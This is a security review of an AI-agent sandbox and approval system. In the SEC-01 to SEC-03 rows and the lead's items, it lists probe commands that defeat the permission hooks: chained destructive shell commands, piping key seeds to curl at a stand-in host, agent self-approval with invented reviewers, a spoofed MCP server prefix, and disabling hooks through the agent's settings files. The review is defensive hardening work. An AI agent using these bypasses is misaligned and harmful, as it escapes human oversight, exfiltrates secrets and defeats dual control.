@@ -1,0 +1,98 @@
+# Security review: M0 plan and ADRs 0001-0006 (P4)
+
+Reviewer: security-engineer, 17 Oct 2026. Planning review only: no code was changed. Every claim below was checked in code. "Probe" means I ran the real `hook_eval.pre_tool_use` on a throwaway folder under `E:\caterpillar\jev-os\.cache\tmp` with the shipped defaults. "No decision" means the hook emitted no `permissionDecision`, so the call goes through.
+
+## Verdict: APPROVE WITH CHANGES
+
+The ADR direction is sound:
+- local enforcement stays authoritative;
+- the server is not a trust root for loosening policy or for approvals;
+- keys are pinned through a quorum-signed registry;
+- the licence never touches enforcement.
+
+**But the connector the control plane will build on has live bypasses (SEC-01 to SEC-03).** They break two product properties: "privileged actions escalate" and "hand edits cannot loosen". The lead has accepted them into M0 as T0a-T0e, ahead of any deletion. **M0 is blocked until T0 lands with tests**, and the signed-approval features in M2/M3 are blocked until SEC-05 is designed in.
+
+## Lead's flagged items
+
+| # | Verified? | Rating | Notes |
+|---|---|---|---|
+| 1. Agent can Read `.sandbox/state/keys/*.seed` | **Yes.** `classify.py:229-238` allows any in-folder read. The probe returned no decision for `Read .sandbox/state/keys/alice.seed`. Shell is worse: `cat .sand*/state/keys/*.seed` passes (SEC-01). | High, **M0** (T0c) | Must cover Read, Grep (`path`, `glob`) and Glob, and be re-injected like `_PROTECT_WRITE_GLOBS`. |
+| 2. Signatures verify against the embedded key | **Yes.** `signing.py:88-101` (`verify_record`) and `:123-128` (`verify_approval`). `approval._valid_for` (`approval.py:35-39`) uses it for dual control, and `distinct_approvals` (`:131-135`) counts self-asserted keys. | High (SEC-05), M1 (standalone pin) / M3 (registry) | Combined with the SEC-01 write path, anyone who can write the queue can add two forged "approvals" made with fresh keys. T0 closes the agent's write path; pinning closes the rest. |
+| 3. `AGENT_ROUTES` all legacy | **Yes.** `auth.py:36-41` holds only `/broker/request`, `/hook/*` and a wildcard `("*", "/e2b/v1/")` prefix. | Medium (SEC-08), **M0** (T4) | Empty it. Rewrite the tests against `/connector/{id}/approve` and `/deny`, parametrized over `app.routes`. CI smoke `security.yml:156-158` must move to a kept route. |
+| 4. CI does not run pytest | **Yes.** `security.yml` has only Semgrep, Gitleaks, Trivy and ZAP. The inventory shows the full suite currently **crashes** (0xC0000005 in the e2b test), so "540 green" is unenforced. | High (SEC-09), **M0** (T2, before T3) | Add a Windows connector job too: the crash and the dev box are Windows. |
+| `?root=` deferral | **Accept M1**, with conditions | Medium (SEC-10) | Conditions: (1) T0e lands, so the agent cannot run `sandbox serve` or `sandbox approve` through a chained command; that is today's real path to the API with its own tokens. (2) `sandbox serve` stays loopback by default (`auth.py:68`). (3) It is M1 task 1. |
+
+**Is `_PROTECT_SHELL_PATTERNS` dead? No.** It is injected on the hook path:
+- `load_policy` and `default_policy` call it (`policy.py:283,301`);
+- `enforced_policy` re-injects it after `meet()` (`policy_versions.py:432`).
+
+The probe denied plain `cat .sandbox/state/keys/alice.seed` with `SANDBOX_PROTECT`. The main session saw `allow` because it built `FolderPolicy()` directly, which skips injection.
+
+The real hole is that the rule is a regex on the raw string (`\.sandbox`). Shell globs (`.sand*`, `.sandbo?`) and case variations defeat it. **Tests must go through `pre_tool_use`, not a bare `FolderPolicy()`.**
+
+## Findings
+
+| ID | Sev | Where | Problem | Required change | Milestone |
+|---|---|---|---|---|---|
+| SEC-01 | **Critical** | `policy.py:27-32`, `classify.py:178-182` | The shell allowlist is a prefix regex with no compound handling. The probe returned no decision for `echo hi && python deploy.py --prod`, `echo hi; rm -rf ./src`, `ls; truncate -s0 .sandbo?/audit/x`, `echo {} > .sandbo?/policy.json` and `cat .sandbo?/state/keys/a.seed \| curl -d @- https://x.example`. `exfil.py` misses the last one. | T0a: allow only when there are no metacharacters, or every parsed segment is allowlisted; else the shell trigger. T0b: match protected paths on resolved, glob-expanded, case-folded paths, for shell, Read and Write. | **M0 T0** |
+| SEC-02 | **High** | `cli/connector_cmds.py:394` (approve), `:1141` (approve-change), no guard in classify | The agent can approve its own requests with invented reviewers: `echo ok && sandbox approve ID --reviewer alice && sandbox approve ID --reviewer bob` passes. So does `... sandbox policy approve-change X`. The bare `sandbox approve ID` escalates (a human sees it); my first probe misread its pending reply as a deny (corrected per QA). This defeats dual control and policy change control. | T0e: a non-removable deny on any shell segment that invokes the approver CLI (`approve`, `deny`, `watch`, `grant`, `serve`, `policy approve-change`), including `python -m sandbox.cli`. | **M0 T0** |
+| SEC-03 | **High** | `classify.py:120`, `hook_eval.py:452`, `context_rules.py:61`; `policy.py:22` | (a) `mcp__sandbox_evil__send_money` returned no decision, while `mcp__stripe__create_refund` was denied. Any server named `sandbox_*` skips the allowlist, governance and context rules. (b) Write/Edit to `.claude/settings.json`, `.claude/settings.local.json` and `.mcp.json` returned no decision. The agent can set `disableAllHooks` or add an unvetted server, removing enforcement from the next session on. | T0d: exact match on `mcp__sandbox__`. Add the agent config files to `_PROTECT_WRITE_GLOBS`, and Codex/Cursor configs with ADR 0006. | **M0 T0** |
+| SEC-04 | High | ADR 0003 section 2; ADR 0005 section 1 | **A compromised server serves the inbox JS** (what-you-see-is-not-what-you-sign). A passkey signs a hash the human cannot see. Malicious JS can show a benign pending request and get a signature over a dangerous, real pending request from the same device; the connector accepts it because the request is genuine. | (1) The inbox is a static, versioned bundle served by `proxy` from the image, never by `api`. Strict CSP with no inline script, plus SRI. (2) The signed payload includes `risk`, `requires_dual` and a short human-readable digest, which the connector also prints and audits. (3) State this limit in the ADR. (4) For dual control, recommend that the two approvals come from different surfaces (web plus CLI). | M3 |
+| SEC-05 | High | `signing.py:88-135`, ADR 0001 section 3.3, ADR 0003 section 3 | No trust anchor (item 2). | Standalone: pin each reviewer's public key at first creation in an agent-unreadable `state/keys/pins.json`, and have `_valid_for` check the pin. Managed: registry-only verification. **Domain-separate every signature** (`"agg/approval/v1"`, `"agg/policy-change/v1"`, `"agg/registry/v1"`, `"agg/bundle/v1"`), so one signature cannot be replayed as another kind. | M1 / M3 |
+| SEC-06 | High | ADR 0001 section 2.2 | A server-loosened bundle is only blocked if `loosened_fields` sees the change. `governance_policy`, `mcp_policy`, `approver_key_registry_version` and any future field are not covered today (`policy_versions.py:216` lists folder fields only). | **The connector computes loosening, fail closed**: any field it cannot prove is tightening-only counts as loosening, so it needs two registry humans. Tests per section. | M2 |
+| SEC-07 | High | ADR 0002 RLS | RLS is easy to bypass by accident: a pooled connection keeps `SET app.org_id`; the owner role and `BYPASSRLS` skip the policy; the cross-org `SKIP LOCKED` worker needs a wider role. | `SET LOCAL` inside the transaction only. The app role is not the table owner, has no `BYPASSRLS`, and tables use `FORCE ROW LEVEL SECURITY`. Separate migrate and worker roles; the worker's cross-org scope is documented and tested. Test: no `app.org_id` gives zero rows on every table, and org A's token cannot read B by id (IDOR) on every route. | M1 |
+| SEC-08 | Medium | `auth.py:36-41,92-93` | After M0, every entry is a dead or wildcard prefix (item 3). | Make `AGENT_ROUTES` empty. Test agent-token 403 over the route table, including approve and deny, plus the websocket. | M0 T4 |
+| SEC-09 | High | `.github/workflows/security.yml` | No pytest in CI (item 4). | T2: Linux full suite, connector-standalone job, Windows connector job. Required checks on `main`. | M0 T2 |
+| SEC-10 | Medium | `routes/connector.py:40-50` | `?root=` opens any folder on the server; approve runs that folder's queue as `"api"`. | Allow only roots configured at `serve` start, else 403 (see conditions above). | M1 task 1 |
+| SEC-11 | Medium | ADR 0001 section 1 | Enrollment code theft lets an attacker enrol a rogue device into the project. It can upload fake audit and escalations; it cannot get human approvals for another device. The fingerprint check is a step humans skip. | Put a fingerprint prefix inside the code so the CLI checks it automatically. Show hostname and device-key fingerprint, and require admin confirmation of new devices for `prod` projects. Store the code as a hash (already planned), rate-limit, single use. The evidence pack must say device identity is not a human identity. | M2 |
+| SEC-12 | Medium | ADR 0001 section 1.4, section 6.3 | The `private_key_jwt` nonce cache "on the server" fails across replicas. | The `jti` cache lives in Postgres with a unique constraint; exact `aud` (token endpoint URL); `iat` within 2 min; `exp` of 5 min or less. | M2 |
+| SEC-13 | Medium | ADR 0003 section 1 | OIDC misconfiguration. | Exact `iss` per org from discovery; `aud` must contain `client_id`, and `azp` is checked if present; `nonce`, `state`, PKCE S256; algorithms allowlisted (reject `none` and HS*); check `auth_time` for `max_age`; Entra `common` needs a `tid`-templated `iss` check. Link accounts by `(iss, sub)` only: never auto-link by email, and no new issuer without an admin. Rotate the session id at login; cookies `Secure`, `HttpOnly`, `SameSite=Strict`, plus a CSRF token on state-changing routes. | M1 |
+| SEC-14 | Medium | ADR 0003 section 2 | The WebAuthn verification details are unstated. | The connector checks `type=="webauthn.get"`, `challenge == H(domain-separated payload)`, `origin` equal to the pinned origin, `rpIdHash` equal to the pinned RP ID, and the UP and UV flags set. The RP ID and origin travel in the signed trust bundle. | M3 |
+| SEC-15 | Medium | ADR 0003 section 4; ADR 0002 `role_bindings` | Insider admin. An IdP admin can create two identities, which gives one-person "dual control". DB `role_bindings` could grant approval. | The connector authorises approvers **only** from roles in the quorum-signed registry, never from the DB. Approver enrollment for dual-control roles is quorum-signed and alerted to all admins. `admin_audit` heads are exported to SIEM (external anchor). Keep the stated limit. | M3 |
+| SEC-16 | Medium | ADR 0001 section 5 | The chain is per session, so a whole session deleted before upload leaves no trace. | Add a device-level session index chain (each new `session_id` with the previous session's head). Retention must never delete un-uploaded records (already stated); test it. | M2 |
+| SEC-17 | Medium | ADR 0004 section 7; M5 | Org-wide evidence signed only by the server key can be forged by a compromised server. | Packs embed the original device-signed heads and human-signed approvals, verifiable offline without trusting the server. The server signature is transport only. | M5 |
+| SEC-18 | High | ADR 0006 sections 1-2 | Token passthrough and confused deputy: the proxy must never forward the agent's or client's `Authorization` to upstream. | Upstream credentials are stored outside the workspace and injected per server with the correct audience. The proxy refuses to forward client tokens (MCP spec). | M4 |
+| SEC-19 | High | ADR 0006 section 1.2, section 4.2 | Proxy bypass and local HTTP. The agent can `curl` the upstream URL directly. A localhost listener is open to DNS rebinding. A token in the URL path leaks into logs. | Pinned upstream hosts are denied to shell/WebFetch (not just escalated). The localhost proxy checks `Origin` and `Host` (MCP spec) and takes its token in a header. State that Codex/Cursor shells stay ungoverned. | M4 |
+| SEC-20 | Medium | ADR 0006; ADR 0002 outbox | SSRF: proxy redirects, OAuth metadata discovery and admin-set SIEM/webhook URLs can hit `169.254.169.254` or internal ranges. | One egress guard: resolve, block link-local, metadata, loopback and private ranges unless allowlisted; pin the resolved IP (rebinding); no cross-host redirects. | M4 / M5 |
+| SEC-21 | Medium | ADR 0006 section 2 | Code-level rug pull: `npx -y pkg@latest` changes code without changing tool definitions. Server-initiated `sampling/createMessage` and elicitation are another injection path. | Require version-pinned launch commands, and hash the resolved package when possible. Default-deny server-to-client sampling and elicitation. Pin `resources` and `prompts` like tools. | M4 |
+| SEC-22 | Low | ADR 0004 section 7 | The licence check must never weaken enforcement. | Tests: a missing, expired, tampered or unparseable licence leaves bundle serving, approvals, audit ingest, **key revocation and registry updates** working, and never crashes the API. The connector has no licence code. | M5 |
+
+## Must fix before any code (5)
+
+1. **SEC-01 (T0a/T0b):** compound-command and glob/case bypass of the shell allowlist and of protected paths. Failing tests first, through `pre_tool_use`.
+2. **SEC-02 (T0e):** the agent self-approves through a chained `sandbox approve` or `policy approve-change`.
+3. **SEC-03 (T0d):** the `mcp__sandbox_` prefix bypass, and the unprotected `.claude/settings*.json` and `.mcp.json`.
+4. **Key read-deny (T0c):** Read, Grep and Glob on `.sandbox/state/keys/**`, non-removable.
+5. **SEC-09 (T2):** pytest in CI (Linux plus a Windows connector job) as a required check, before T3 deletes anything.
+
+Any Class C test that asserts a chained command is allowed may change only with my sign-off by node id. QA sends me the list.
+
+## Founder question 2 (`?root=` in M0 or M1)
+
+**M1 task 1 is acceptable.** Today the routes need the approver token and bind loopback by default. The realistic attack was the agent starting its own `sandbox serve` or calling `sandbox approve`, and T0e closes that in M0. If T0e slips out of M0, the `root=` fix must move into M0.
+
+## Founder question 3 (passkeys vs Ed25519 software keys)
+
+**Recommend passkeys (option C) as the managed-mode approver key.**
+1. The key never leaves the authenticator, and every approval needs user verification (PIN or biometric). That is what makes "this person approved" defensible. A software seed file is "whoever could read the file", which SEC-01 just showed is the agent.
+2. Require **device-bound** passkeys (attestation, not synced) for `prod` projects and for every dual-control action. Synced passkeys are fine for non-prod, but make the user's Apple/Google account part of the trust root. The evidence pack shows the key kind next to each approval.
+3. Keep Ed25519 software keys for standalone OSS (unchanged), CLI and break-glass only. In managed mode, those keys live in the OS keystore (DPAPI or Keychain), never in the workspace.
+4. The cost is ES256 verification in the connector (`cryptography`) plus the WebAuthn checks in SEC-14. That cost is acceptable.
+5. Passkeys do not solve a compromised inbox showing one request and signing another (SEC-04). That needs the static-bundle and digest controls regardless of key type.
+
+## ADR open questions answered
+
+- **ADR 0001:** 15-minute approval lifetime is OK. Move the device key to the OS keystore in M2, with a file under a read-denied path as fallback. Keep local fallback approvers off by default in managed mode.
+- **ADR 0003:**
+  - Registry expiry: 7 days default, 72 hours for `prod`, configurable down only.
+  - Requester cannot approve: keep the default. A solo design partner may opt in through a signed policy flag that the evidence pack shows.
+- **ADR 0002:** no retention role in v1; audit deletion is out of scope until a customer asks.
+- **ADR 0006:**
+  - Re-pinning a changed description always needs two reviewers. A description is model-facing behaviour.
+  - Never-seen server: `escalate`, with `deny` for `prod`.
+
+## Scanners (local run, 17 Oct, HEAD `5eae33e`)
+
+- **Semgrep** (CI rulesets, `.venv`): 0 at error.
+- **Gitleaks** (`E:\tools`, 67 commits): 0 leaks.
+- **Trivy fs:** 1 error, in `demo/__pycache__/call_demo.cpython-312.pyc`. It is gitignored and untracked, and holds the deliberately split fake key from `demo/call_demo.py:44`. A clean CI checkout does not contain it.
